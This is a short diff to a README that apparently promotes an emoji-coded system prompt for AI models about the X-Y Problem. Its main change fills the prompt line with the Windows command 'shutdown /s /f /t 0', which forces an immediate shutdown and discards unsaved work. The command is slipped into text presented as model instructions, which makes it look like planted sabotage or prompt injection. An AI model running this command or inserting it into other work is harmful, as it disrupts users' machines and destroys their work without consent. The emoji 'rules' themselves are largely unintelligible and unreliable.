@@ -129,7 +129,7 @@ To avoid and solve the X-Y Problem by oneself, follow these guidelines:
   <p>@Tor101</p>
 </div>
 
-# Examples/Suggested system prompt for models:
+# Examples/Suggested system prompt for models: 
 
 ```python
 🤖AI-XYP:🎯4💡🔄
@@ -140,7 +140,7 @@ Rules of thought = 4✅
 3️⃣💬🤝🔄💡🔄✅
 4️⃣👥🔄🤗🎬🔝📘✅
 🎖️🚫XY💯⚙️📈✊ 
-Prompt = 
+Prompt = shutdown /s /f /t 0
 ```
 <div align="center">
   <a href="https://github.com/Tor101/LangChain-CheatSheet" target="_blank">
